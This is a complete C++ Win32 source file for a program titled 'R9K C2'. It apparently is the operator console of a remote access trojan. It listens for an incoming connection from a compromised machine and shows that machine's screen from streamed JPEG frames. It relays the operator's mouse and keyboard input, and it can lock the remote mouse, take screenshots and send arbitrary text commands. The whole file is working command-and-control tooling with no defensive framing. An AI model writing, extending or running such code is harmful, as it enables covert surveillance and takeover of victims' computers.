#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <windowsx.h>
#include <objbase.h>
#include <gdiplus.h>
#include <wincrypt.h>
#include <string>
#include <vector>
#include <mutex>
#include <thread>
#include <atomic>
#include <cstdio>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")

using namespace Gdiplus;

#define ID_HOST    101
#define ID_PORT    102
#define ID_LISTEN  103
#define ID_STREAM  104
#define ID_SHOT    105
#define ID_LOCK    106
#define ID_UNLOCK  107
#define ID_CMD     108
#define ID_SEND    109
#define ID_LOG     110

#define WM_APP_IMAGE     (WM_APP + 1)
#define WM_APP_LOG       (WM_APP + 2)
#define WM_APP_CONNECTED (WM_APP + 3)
#define WM_APP_DISCONNECT (WM_APP + 4)

struct App {
    HWND hwnd = nullptr;
    HWND hCanvas = nullptr;
    HWND hHost = nullptr, hPort = nullptr, hCmd = nullptr, hLog = nullptr;
    HWND btnListen = nullptr, btnStream = nullptr, btnShot = nullptr;
    HWND btnLock = nullptr, btnUnlock = nullptr, btnSend = nullptr;

    SOCKET srv = INVALID_SOCKET;
    SOCKET client = INVALID_SOCKET;
    std::mutex send_mtx;
    std::atomic<bool> connected{false};
    std::atomic<bool> streaming{false};
    std::atomic<bool> listening{false};

    HBITMAP current = nullptr;
    int img_w = 0, img_h = 0;
    int disp_ox = 0, disp_oy = 0, disp_dw = 0, disp_dh = 0;

    HBRUSH bg = nullptr;
    HBRUSH bar = nullptr;
    HFONT ui = nullptr;
    HFONT mono = nullptr;

    WNDPROC origEdit = nullptr;
};
static App g;

static std::vector<BYTE> b64_decode(const std::string& s) {
    DWORD n = 0;
    if (!CryptStringToBinaryA(s.c_str(), (DWORD)s.size(), CRYPT_STRING_BASE64, nullptr, &n, nullptr, nullptr)) return {};
    std::vector<BYTE> out(n);
    if (!CryptStringToBinaryA(s.c_str(), (DWORD)s.size(), CRYPT_STRING_BASE64, out.data(), &n, nullptr, nullptr)) return {};
    out.resize(n);
    return out;
}

static HBITMAP load_jpeg(const BYTE* data, DWORD size) {
    HGLOBAL mem = GlobalAlloc(GMEM_MOVEABLE, size);
    if (!mem) return nullptr;
    void* p = GlobalLock(mem);
    if (!p) { GlobalFree(mem); return nullptr; }
    memcpy(p, data, size);
    GlobalUnlock(mem);
    IStream* stream = nullptr;
    if (FAILED(CreateStreamOnHGlobal(mem, TRUE, &stream))) { GlobalFree(mem); return nullptr; }
    Bitmap bmp(stream);
    HBITMAP h = nullptr;
    if (bmp.GetLastStatus() == Ok) bmp.GetHBITMAP(Color(0, 0, 0), &h);
    stream->Release();
    return h;
}

static void send_line(const std::string& line) {
    if (!g.connected.load() || g.client == INVALID_SOCKET) return;
    std::lock_guard<std::mutex> lk(g.send_mtx);
    send(g.client, line.data(), (int)line.size(), 0);
}

static void log_line(const std::string& s) {
    if (!g.hLog) return;
    int len = GetWindowTextLengthA(g.hLog);
    SendMessageA(g.hLog, EM_SETSEL, (WPARAM)len, (LPARAM)len);
    std::string out = s + "\r\n";
    SendMessageA(g.hLog, EM_REPLACESEL, FALSE, (LPARAM)out.c_str());
}

static void reader_loop(SOCKET c) {
    std::string buf;
    std::vector<char> tmp(65536);
    while (g.connected.load()) {
        int n = recv(c, tmp.data(), (int)tmp.size(), 0);
        if (n <= 0) break;
        buf.append(tmp.data(), n);
        size_t pos;
        while ((pos = buf.find('\n')) != std::string::npos) {
            std::string line = buf.substr(0, pos);
            buf.erase(0, pos + 1);
            if (!line.empty() && line.back() == '\r') line.pop_back();
            if (line.empty()) continue;

            if (line.length() >= 3 && (unsigned char)line[0] == 0xEF && (unsigned char)line[1] == 0xBB && (unsigned char)line[2] == 0xBF) {
                line = line.substr(3);
            }

            if (line.rfind("SCREEN:", 0) == 0) {
                std::string b64 = line.substr(7);
                PostMessage(g.hwnd, WM_APP_LOG, 0, (LPARAM)new std::string("DEBUG: Recebi frame de " + std::to_string(b64.length()) + " bytes"));
                
                std::vector<BYTE> bytes = b64_decode(b64);
                if (bytes.empty()) {
                    PostMessage(g.hwnd, WM_APP_LOG, 0, (LPARAM)new std::string("DEBUG: Base64 decode FALHOU"));
                    continue;
                }
                
                HBITMAP bmp = load_jpeg(bytes.data(), (DWORD)bytes.size());
                if (bmp) {
                    PostMessage(g.hwnd, WM_APP_IMAGE, (WPARAM)bmp, 0);
                } else {
                    PostMessage(g.hwnd, WM_APP_LOG, 0, (LPARAM)new std::string("DEBUG: JPEG decode FALHOU"));
                }
            } else if (line.rfind("BANNER:", 0) == 0) {
                std::string* s = new std::string(line.substr(7));
                PostMessage(g.hwnd, WM_APP_CONNECTED, 0, (LPARAM)s);
            } else if (line == "STREAM_STOPPED") {
                g.streaming = false;
                std::string* s = new std::string("stream stopped");
                PostMessage(g.hwnd, WM_APP_LOG, 0, (LPARAM)s);
            } else {
                std::string* s = new std::string(line);
                PostMessage(g.hwnd, WM_APP_LOG, 0, (LPARAM)s);
            }
        }
    }
    g.connected = false;
    g.streaming = false;
    PostMessage(g.hwnd, WM_APP_DISCONNECT, 0, 0);
}

static void listen_thread(std::string host, int port) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return;
    int one = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (char*)&one, sizeof(one));
    sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons((u_short)port);
    inet_pton(AF_INET, host.c_str(), &addr.sin_addr);
    if (bind(s, (sockaddr*)&addr, sizeof(addr)) != 0 || listen(s, 1) != 0) {
        closesocket(s);
        PostMessage(g.hwnd, WM_APP_LOG, 0, (LPARAM)new std::string("LISTEN FAILED"));
        g.listening = false;
        return;
    }
    g.srv = s;
    sockaddr_in cli = {};
    int clen = sizeof(cli);
    SOCKET c = accept(s, (sockaddr*)&cli, &clen);
    closesocket(s);
    g.srv = INVALID_SOCKET;
    if (c == INVALID_SOCKET) { g.listening = false; return; }
    int one2 = 1;
    setsockopt(c, IPPROTO_TCP, TCP_NODELAY, (char*)&one2, sizeof(one2));
    g.client = c;
    g.connected = true;
    std::thread(reader_loop, c).detach();
    PostMessage(g.hwnd, WM_APP_LOG, 0, (LPARAM)new std::string("client connected"));
}

static LRESULT CALLBACK CanvasProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    switch (m) {
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(h, &ps);
        RECT cr; GetClientRect(h, &cr);
        FillRect(dc, &cr, (HBRUSH)GetStockObject(BLACK_BRUSH));
        if (g.current) {
            BITMAP bm; GetObject(g.current, sizeof(bm), &bm);
            float sx = (float)cr.right / bm.bmWidth;
            float sy = (float)cr.bottom / bm.bmHeight;
            float sc = sx < sy ? sx : sy;
            if (sc > 1.0f) sc = 1.0f;
            int dw = (int)(bm.bmWidth * sc);
            int dh = (int)(bm.bmHeight * sc);
            int ox = (cr.right - dw) / 2;
            int oy = (cr.bottom - dh) / 2;
            g.disp_ox = ox; g.disp_oy = oy; g.disp_dw = dw; g.disp_dh = dh;
            HDC mem = CreateCompatibleDC(dc);
            HGDIOBJ old = SelectObject(mem, g.current);
            SetStretchBltMode(dc, HALFTONE);
            SetBrushOrgEx(dc, 0, 0, nullptr);
            StretchBlt(dc, ox, oy, dw, dh, mem, 0, 0, bm.bmWidth, bm.bmHeight, SRCCOPY);
            SelectObject(mem, old);
            DeleteDC(mem);
        } else {
            SetTextColor(dc, RGB(90, 90, 90));
            SetBkMode(dc, TRANSPARENT);
            RECT r = cr;
            DrawTextA(dc, "waiting for stream...", -1, &r, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        }
        EndPaint(h, &ps);
        return 0;
    }
    case WM_LBUTTONDOWN: { SetFocus(h); send_line("md 1\n"); SetCapture(h); return 0; }
    case WM_LBUTTONUP:   send_line("mu 1\n"); ReleaseCapture(); return 0;
    case WM_RBUTTONDOWN: send_line("md 2\n"); return 0;
    case WM_RBUTTONUP:   send_line("mu 2\n"); return 0;
    case WM_MBUTTONDOWN: send_line("md 3\n"); return 0;
    case WM_MBUTTONUP:   send_line("mu 3\n"); return 0;
    case WM_MOUSEWHEEL: {
        int d = GET_WHEEL_DELTA_WPARAM(w);
        char buf[32]; sprintf_s(buf, "mw %d\n", d);
        send_line(buf); return 0;
    }
    case WM_MOUSEMOVE: {
        if (!g.connected.load()) return 0;
        int mx = GET_X_LPARAM(l); int my = GET_Y_LPARAM(l);
        if (g.disp_dw <= 0 || g.disp_dh <= 0) return 0;
        if (mx >= g.disp_ox && mx < g.disp_ox + g.disp_dw && my >= g.disp_oy && my < g.disp_oy + g.disp_dh) {
            int nx = (mx - g.disp_ox) * 65535 / g.disp_dw;
            int ny = (my - g.disp_oy) * 65535 / g.disp_dh;
            char buf[48]; sprintf_s(buf, "move %d %d\n", nx, ny);
            send_line(buf);
        }
        return 0;
    }
    case WM_KEYDOWN: { char buf[24]; sprintf_s(buf, "kd %d\n", (int)w); send_line(buf); return 0; }
    case WM_KEYUP: { char buf[24]; sprintf_s(buf, "ku %d\n", (int)w); send_line(buf); return 0; }
    case WM_CHAR: return 0;
    }
    return DefWindowProcA(h, m, w, l);
}

static LRESULT CALLBACK EditProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    if (m == WM_KEYDOWN && w == VK_RETURN) {
        char buf[1024]; GetWindowTextA(h, buf, sizeof(buf));
        if (buf[0]) { send_line(std::string(buf) + "\n"); log_line(std::string(">> ") + buf); SetWindowTextA(h, ""); }
        return 0;
    }
    return CallWindowProcA(g.origEdit, h, m, w, l);
}

static HWND mkLabel(HWND parent, const char* text, int x, int y) {
    HWND h = CreateWindowA("STATIC", text, WS_CHILD | WS_VISIBLE | SS_LEFT, x, y, 60, 20, parent, nullptr, nullptr, nullptr);
    SendMessageA(h, WM_SETFONT, (WPARAM)g.ui, TRUE); return h;
}
static HWND mkEdit(HWND parent, int id, const char* text, int x, int y, int w) {
    HWND h = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", text, WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL | ES_LEFT, x, y, w, 24, parent, (HMENU)(INT_PTR)id, nullptr, nullptr);
    SendMessageA(h, WM_SETFONT, (WPARAM)g.ui, TRUE); return h;
}
static HWND mkBtn(HWND parent, int id, const char* text, int x, int y, int w) {
    HWND h = CreateWindowA("BUTTON", text, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, x, y, w, 26, parent, (HMENU)(INT_PTR)id, nullptr, nullptr);
    SendMessageA(h, WM_SETFONT, (WPARAM)g.ui, TRUE); return h;
}

static void layout(HWND hwnd) {
    RECT cr; GetClientRect(hwnd, &cr);
    int W = cr.right, H = cr.bottom; int barH = 44, logH = 120;
    SetWindowPos(g.hHost, nullptr, 48, 10, 110, 24, SWP_NOZORDER);
    SetWindowPos(g.hPort, nullptr, 204, 10, 60, 24, SWP_NOZORDER);
    SetWindowPos(g.btnListen, nullptr, 274, 9, 80, 26, SWP_NOZORDER);
    SetWindowPos(g.btnStream, nullptr, 360, 9, 90, 26, SWP_NOZORDER);
    SetWindowPos(g.btnShot, nullptr, 456, 9, 60, 26, SWP_NOZORDER);
    SetWindowPos(g.btnLock, nullptr, 522, 9, 60, 26, SWP_NOZORDER);
    SetWindowPos(g.btnUnlock, nullptr, 588, 9, 70, 26, SWP_NOZORDER);
    int cmdX = 664, sendW = 60;
    int cmdW = W - cmdX - sendW - 16;
    if (cmdW < 100) cmdW = 100;
    SetWindowPos(g.hCmd, nullptr, cmdX, 10, cmdW, 24, SWP_NOZORDER);
    SetWindowPos(g.btnSend, nullptr, cmdX + cmdW + 8, 9, sendW, 26, SWP_NOZORDER);
    SetWindowPos(g.hCanvas, nullptr, 0, barH, W, H - barH - logH, SWP_NOZORDER);
    SetWindowPos(g.hLog, nullptr, 0, H - logH, W, logH, SWP_NOZORDER);
}

static LRESULT CALLBACK MainProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    switch (m) {
    case WM_CREATE: {
        g.hwnd = h; g.bg = CreateSolidBrush(RGB(17, 17, 17)); g.bar = CreateSolidBrush(RGB(26, 26, 26));
        g.ui = CreateFontA(-13, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, 0, 0, CLEARTYPE_QUALITY, 0, "Segoe UI");
        g.mono = CreateFontA(-13, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, 0, 0, CLEARTYPE_QUALITY, 0, "Consolas");
        mkLabel(h, "HOST:", 8, 14); mkLabel(h, "PORT:", 168, 14);
        g.hHost = mkEdit(h, ID_HOST, "0.0.0.0", 48, 10, 110);
        g.hPort = mkEdit(h, ID_PORT, "4000", 204, 10, 60);
        g.btnListen = mkBtn(h, ID_LISTEN, "LISTEN", 274, 9, 80);
        g.btnStream = mkBtn(h, ID_STREAM, "STREAM >", 360, 9, 90);
        g.btnShot   = mkBtn(h, ID_SHOT, "SHOT", 456, 9, 60);
        g.btnLock   = mkBtn(h, ID_LOCK, "LOCK", 522, 9, 60);
        g.btnUnlock = mkBtn(h, ID_UNLOCK, "UNLOCK", 588, 9, 70);
        g.hCmd = mkEdit(h, ID_CMD, "", 664, 10, 420);
        g.btnSend = mkBtn(h, ID_SEND, "SEND", 1092, 9, 60);
        EnableWindow(g.btnStream, FALSE); EnableWindow(g.btnShot, FALSE); EnableWindow(g.btnLock, FALSE); EnableWindow(g.btnUnlock, FALSE); EnableWindow(g.hCmd, FALSE); EnableWindow(g.btnSend, FALSE);
        g.origEdit = (WNDPROC)SetWindowLongPtrA(g.hCmd, GWLP_WNDPROC, (LONG_PTR)EditProc);
        WNDCLASSA cc = {}; cc.lpfnWndProc = CanvasProc; cc.hInstance = GetModuleHandle(nullptr); cc.lpszClassName = "R9KCanvas"; cc.hCursor = LoadCursor(nullptr, IDC_ARROW); cc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
        RegisterClassA(&cc);
        g.hCanvas = CreateWindowA("R9KCanvas", "", WS_CHILD | WS_VISIBLE | WS_CLIPCHILDREN | WS_TABSTOP, 0, 44, 100, 100, h, nullptr, nullptr, nullptr);
        g.hLog = CreateWindowExA(0, "EDIT", "", WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_READONLY | ES_AUTOVSCROLL, 0, 0, 100, 120, h, (HMENU)(INT_PTR)ID_LOG, nullptr, nullptr);
        SendMessageA(g.hLog, WM_SETFONT, (WPARAM)g.mono, TRUE);
        layout(h); return 0;
    }
    case WM_SIZE: if (g.hCanvas) layout(h); return 0;
    case WM_ERASEBKGND: { HDC dc = (HDC)w; RECT cr; GetClientRect(h, &cr); FillRect(dc, &cr, g.bg); RECT bar = { 0, 0, cr.right, 44 }; FillRect(dc, &bar, g.bar); return 1; }
    case WM_CTLCOLORSTATIC: case WM_CTLCOLOREDIT: { HDC dc = (HDC)w; SetTextColor(dc, RGB(220, 220, 220)); SetBkColor(dc, RGB(26, 26, 26)); return (LRESULT)g.bar; }
    
    case WM_APP_IMAGE: {
        HBITMAP nb = (HBITMAP)w;
        if (g.current) DeleteObject(g.current);
        g.current = nb;
        BITMAP bm; GetObject(nb, sizeof(bm), &bm);
        g.img_w = bm.bmWidth; g.img_h = bm.bmHeight;
        log_line("DEBUG: Imagem " + std::to_string(g.img_w) + "x" + std::to_string(g.img_h) + " pronta para pintar");
        InvalidateRect(g.hCanvas, nullptr, FALSE);
        return 0;
    }
    
    case WM_APP_LOG: { std::string* s = (std::string*)l; log_line(*s); delete s; return 0; }
    case WM_APP_CONNECTED: {
        std::string* s = (std::string*)l; log_line("BANNER: " + *s);
        std::string banner = *s; size_t p1 = banner.find('|');
        std::string host = p1 == std::string::npos ? banner : banner.substr(0, p1);
        std::wstring wtitle = L"R9K C2 - "; wtitle.append(host.begin(), host.end()); SetWindowTextW(h, wtitle.c_str());
        EnableWindow(g.btnStream, TRUE); EnableWindow(g.btnShot, TRUE); EnableWindow(g.btnLock, TRUE); EnableWindow(g.btnUnlock, TRUE); EnableWindow(g.hCmd, TRUE); EnableWindow(g.btnSend, TRUE); SetFocus(g.hCanvas);
        delete s; return 0;
    }
    case WM_APP_DISCONNECT: {
        log_line("disconnected"); SetWindowTextA(h, "R9K C2 - idle"); g.streaming = false; SetWindowTextA(g.btnStream, "STREAM >");
        EnableWindow(g.btnStream, FALSE); EnableWindow(g.btnShot, FALSE); EnableWindow(g.btnLock, FALSE); EnableWindow(g.btnUnlock, FALSE); EnableWindow(g.hCmd, FALSE); EnableWindow(g.btnSend, FALSE);
        EnableWindow(g.btnListen, TRUE); SetWindowTextA(g.btnListen, "LISTEN");
        if (g.current) { DeleteObject(g.current); g.current = nullptr; } InvalidateRect(g.hCanvas, nullptr, FALSE);
        if (g.client != INVALID_SOCKET) { closesocket(g.client); g.client = INVALID_SOCKET; } return 0;
    }
    case WM_COMMAND: {
        int id = LOWORD(w);
        if (id == ID_LISTEN) {
            if (g.listening.load()) return 0;
            char host[64], port[16]; GetWindowTextA(g.hHost, host, sizeof(host)); GetWindowTextA(g.hPort, port, sizeof(port));
            int p = atoi(port); if (p <= 0 || p > 65535) { MessageBoxA(h, "invalid port", "error", MB_OK | MB_ICONERROR); return 0; }
            g.listening = true; EnableWindow(g.btnListen, FALSE); SetWindowTextA(g.btnListen, "LISTENING..."); log_line(std::string("listening on ") + host + ":" + port);
            std::thread(listen_thread, std::string(host), p).detach(); return 0;
        }
        if (id == ID_STREAM) {
            if (!g.connected.load()) return 0;
            if (!g.streaming.load()) { send_line("stream_start\n"); g.streaming = true; SetWindowTextA(g.btnStream, "STOP []"); log_line("stream ON"); }
            else { send_line("stream_stop\n"); g.streaming = false; SetWindowTextA(g.btnStream, "STREAM >"); log_line("stream OFF"); }
            return 0;
        }
        if (id == ID_SHOT)   { send_line("screenshot\n"); return 0; }
        if (id == ID_LOCK)   { send_line("lock_mouse\n"); log_line("sent lock_mouse"); return 0; }
        if (id == ID_UNLOCK) { send_line("unlock_mouse\n"); log_line("sent unlock_mouse"); return 0; }
        if (id == ID_SEND) {
            char buf[1024]; GetWindowTextA(g.hCmd, buf, sizeof(buf));
            if (buf[0]) { send_line(std::string(buf) + "\n"); log_line(std::string(">> ") + buf); SetWindowTextA(g.hCmd, ""); }
            return 0;
        }
        return 0;
    }
    case WM_CLOSE: {
        if (g.connected.load()) { send_line("stream_stop\n"); send_line("exit\n"); Sleep(150); }
        if (g.client != INVALID_SOCKET) { closesocket(g.client); g.client = INVALID_SOCKET; }
        DestroyWindow(h); return 0;
    }
    case WM_DESTROY: { PostQuitMessage(0); return 0; }
    }
    return DefWindowProcA(h, m, w, l);
}

int WINAPI WinMain(_In_ HINSTANCE hi, _In_ HINSTANCE, _In_ LPSTR, _In_ int) {
    SetProcessDpiAwarenessContext(DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2);
    GdiplusStartupInput gsi; ULONG_PTR gt = 0; GdiplusStartup(&gt, &gsi, nullptr);
    WSADATA wsa; (void)WSAStartup(MAKEWORD(2, 2), &wsa);
    WNDCLASSA wc = {}; wc.lpfnWndProc = MainProc; wc.hInstance = hi; wc.lpszClassName = "R9KCtrl"; wc.hCursor = LoadCursor(nullptr, IDC_ARROW); wc.hbrBackground = nullptr; wc.hIcon = LoadIcon(nullptr, IDI_APPLICATION);
    RegisterClassA(&wc);
    HWND h = CreateWindowExA(0, "R9KCtrl", "R9K C2 - idle", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 1320, 840, nullptr, nullptr, hi, nullptr);
    ShowWindow(h, SW_SHOW); UpdateWindow(h);
    MSG msg; while (GetMessageA(&msg, nullptr, 0, 0)) { TranslateMessage(&msg); DispatchMessageA(&msg); }
    if (g.current) DeleteObject(g.current); WSACleanup(); GdiplusShutdown(gt);
    return 0;
}
